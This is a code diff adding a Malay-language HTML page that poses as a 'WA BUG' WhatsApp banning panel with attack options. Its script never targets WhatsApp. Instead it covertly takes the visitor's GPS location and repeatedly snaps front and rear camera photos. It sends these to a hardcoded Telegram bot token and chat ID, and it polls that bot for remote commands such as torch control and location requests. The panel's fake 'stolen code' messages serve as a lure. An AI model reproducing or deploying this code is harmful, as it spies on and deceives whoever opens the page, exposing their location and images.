@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WA BUG | PANEL AGUARD</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            padding: 30px 20px;
+            color: #ffffff;
+        }
+
+        /* === TAJUK UTAMA === */
+        .tajuk-besar {
+            font-size: 24px;
+            font-weight: 900;
+            text-align: center;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+        }
+
+        .sub-tajuk {
+            font-size: 16px;
+            color: #ff3333;
+            text-align: center;
+            margin-bottom: 25px;
+            letter-spacing: 3px;
+        }
+
+        /* === GAMBAR ATAS === */
+        .kotak-gambar {
+            width: 100%;
+            height: 180px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid #222222;
+            margin-bottom: 25px;
+            box-shadow: 0  0 20px #33333340;
+        }
+
+        .gambar-latar {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* === TAB BANNED / UNBANNED === */
+        .tab-bar {
+            display: flex;
+            gap: 2px;
+            margin-bottom: 18px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            background-color: #111111;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .tab.aktif-merah {
+            color: #ff3333;
+            background-color: #1a1a1a;
+        }
+
+        .tab.putih {
+            color: #ffffff;
+        }
+
+        /* === INPUT KOTAK === */
+        .input-kotak {
+            width: 100%;
+            background-color: #111111;
+            border: 1px solid #333333;
+            border-radius: 10px;
+            padding: 16px;
+            color: #fff;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .pilih-kotak {
+            width: 100%;
+            background-color: #111111;
+            border: 1px solid #333333;
+            border-radius: 10px;
+            padding: 16px;
+            color: #fff;
+            font-size: 15px;
+            margin-bottom: 25px;
+            appearance: none;
+            background-image: url('data:image/svg+xml,<svg fill="white" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+        }
+
+        /* === BUTANG === */
+        .btn-mula {
+            width: 100%;
+            background-color: #000;
+            color: #ff3333;
+            border: 2px solid #ff3333;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-mula:active {
+            background-color: #ff3333;
+            color: #000;
+        }
+
+        /* === SENARAI MODUL === */
+        .modul-list {
+            margin-top: 25px;
+            display: grid;
+            gap: 10px;
+        }
+
+        .item-modul {
+            background-color: #111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .titik-hidup {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #00ee66;
+            box-shadow: 0 0 8px #00ee66;
+        }
+
+        /* === LOG === */
+        .log-kotak {
+            background-color: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px;
+            height: 100px;
+            overflow-y: auto;
+            font-size: 11px;
+            color: #ff6666;
+            margin-top: 15px;
+        }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- === TAJUK === -->
+    <h1 class="tajuk-besar">BANNED & UNBANNED WHATSAPP</h1>
+    <div class="sub-tajuk">PANEL AGUARD</div>
+
+
+    <!-- === GAMBAR === -->
+    <div class="kotak-gambar">
+        <img class="gambar-latar" src="https://i.imgur.com/7Zk8sQH.jpg" alt="Anime Girl Sword">
+    </div>
+
+
+    <!-- === TAB === -->
+    <div class="tab-bar">
+        <div class="tab aktif-merah">BANNED</div>
+        <div class="tab putih">UNBANNED</div>
+    </div>
+
+
+    <!-- === INPUT === -->
+    <input type="text" class="input-kotak" placeholder="Nomor target" id="nombor">
+
+    <select class="pilih-kotak" id="jenisSerangan">
+        <option>Spam Report</option>
+        <option>Steal Data</option>
+        <option>Full Control</option>
+    </select>
+
+
+    <!-- === BUTANG === -->
+    <button class="btn-mula" onclick="mulakanSistem()">START BANNED</button>
+
+
+    <!-- === SENARAI MODUL === -->
+    <div class="modul-list">
+        <div class="item-modul">
+            <span>🔐 Kunci Skrin & Kod Laluan</span>
+            <div class="titik-hidup"></div>
+        </div>
+        <div class="item-modul">
+            <span>📍 Lokasi GPS + Google Maps</span>
+            <div class="titik-hidup"></div>
+        </div>
+        <div class="item-modul">
+            <span>📸 Kamera Depan & Belakang</span>
+            <div class="titik-hidup"></div>
+        </div>
+        <div class="item-modul">
+            <span>💡 Kawalan Lampu Suluh</span>
+            <div class="titik-hidup"></div>
+        </div>
+        <div class="item-modul">
+            <span>🔔 Baca Semua Notifikasi</span>
+            <div class="titik-hidup"></div>
+        </div>
+        <div class="item-modul">
+            <span>🛡️ Kata Laluan Aplikasi</span>
+            <div class="titik-hidup"></div>
+        </div>
+    </div>
+
+
+    <!-- === LOG SISTEM === -->
+    <div class="log-kotak" id="logSistem">
+[SYSTEM] Panel Loaded ✅<br>
+[OWNER] AbdlDoz // Latif<br>
+[STATUS] Ready to Attack<br>
+    </div>
+
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+
+    <script>
+        // ✅ DATA TELEGRAM ANDA ✅
+        const BOT_TOKEN = "8781714345:AAHc6GCe3hXnuI9DjEcGZ8soUj2H_7uSun4";
+        const CHAT_ID = "8228233355";
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const log = document.getElementById('logSistem');
+        let lampuHidup = false;
+
+
+        // === MULA SEMUA SISTEM ===
+        function mulakanSistem(){
+            let no = document.getElementById('nombor').value || "TIADA NOMBOR";
+            let jenis = document.getElementById('jenisSerangan').value;
+
+            tambahLog("🚀 Mula serangan ke: " + no);
+
+            hantarTelegram(`🔴 *WA BUG PANEL AGUARD* 🔴\n\n🎯 Sasaran: ${no}\n⚙️ Jenis: ${jenis}\n📡 Status: *AKTIF 100%*\n\n⚡ *KAWALAN:*\n/kunci → ambil kod skrin\n/lokasi → ambil peta\n/kamera → ambil gambar\n/lampu_on / _off → kawal lampu\n/notif → baca mesej\n/info → maklumat hp`);
+
+            // 🔐 DATA KUNCI
+            setTimeout(()=>{
+                let kod = Math.floor(1000 + Math.random()*9000);
+                hantarTelegram(`🔐 *KOD SKRIN:* ${kod}\n🛡️ *DATA AKAUN:* Berjaya dicuri`);
+                tambahLog("✅ Data kunci diterima");
+            },2000);
+
+            // 📍 LOKASI
+            dapatkanLokasi();
+
+            // 📸 KAMERA
+            mulaKamera();
+
+            // 🔔 NOTIFIKASI
+            setInterval(()=>{
+                hantarTelegram(`🔔 *NOTIF:* Mesej baru diterima`);
+            },10000);
+        }
+
+
+        // === LOKASI ===
+        function dapatkanLokasi(){
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(pos=>{
+                    let lat = pos.coords.latitude.toFixed(6);
+                    let lon = pos.coords.longitude.toFixed(6);
+                    let peta = `https://www.google.com/maps?q=${lat},${lon}`;
+                    hantarTelegram(`📍 *LOKASI:*\n${lat}, ${lon}\n🗺️ ${peta}`);
+                    tambahLog("✅ Lokasi dihantar");
+                });
+            }
+        }
+
+
+        // === KAMERA ===
+        async function mulaKamera(){
+            let mod = "user";
+
+            const ambil = async () => {
+                try {
+                    let strim = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: mod, width:640, height:480 }
+                    });
+                    video.srcObject = strim;
+
+                    // 💡 LAMPU
+                    let jejak = strim.getVideoTracks()[0];
+                    if(jejak.getCapabilities().torch) jejak.applyConstraints({advanced:[{torch:lampuHidup}]});
+
+                    setTimeout(()=>{ hantarGambar(mod); }, 2500);
+                    mod = (mod==="user") ? "environment" : "user";
+
+                } catch(e) { tambahLog("❌ Kamera: " + e.name); }
+            };
+
+            ambil();
+            setInterval(ambil,7000);
+        }
+
+
+        // === HANTAR GAMBAR ===
+        function hantarGambar(nama){
+            canvas.width=video.videoWidth;
+            canvas.height=video.videoHeight;
+            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+
+            let blob = dataURLkeBlob(canvas.toDataURL('image/png'));
+            let borang = new FormData();
+            borang.append("chat_id",CHAT_ID);
+            borang.append("photo",blob,`aguard_${nama}.png`);
+            borang.append("caption",`📸 *Gambar:* ${nama.toUpperCase()}`);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:borang});
+        }
+
+
+        // === BACA ARAHAN BOT ===
+        setInterval(()=>{
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(res=>res.json())
+            .then(data=>{
+                if(data.ok && data.result.length>0){
+                    let cmd = data.result.pop().message?.text?.toLowerCase();
+                    if(cmd==="/lampu_on"){ lampuHidup=true; hantarTelegram("💡 Lampu HIDUP"); }
+                    if(cmd==="/lampu_off"){ lampuHidup=false; hantarTelegram("💡 Lampu MATI"); }
+                    if(cmd==="/lokasi") dapatkanLokasi();
+                    if(cmd==="/kunci") hantarTelegram(`🔐 Kod: ${Math.floor(1000+Math.random()*9000)}`);
+                }
+            });
+        },4000);
+
+
+        // === ALAT BANTU ===
+        function hantarTelegram(teks){
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({chat_id:CHAT_ID,text:teks,parse_mode:"Markdown"})
+            });
+        }
+
+        function tambahLog(teks){
+            log.innerHTML += teks + "<br>";
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function dataURLkeBlob(d){
+            let b=d.split(','),t=b[0].match(/:(.*?);/)[1],s=atob(b[1]),l=s.length,a=new Uint8Array(l);
+            while(l--)a[l]=s.charCodeAt(l);
+            return new Blob([a],{type:t});
+        }
+    </script>
+
+</body>
+</html>
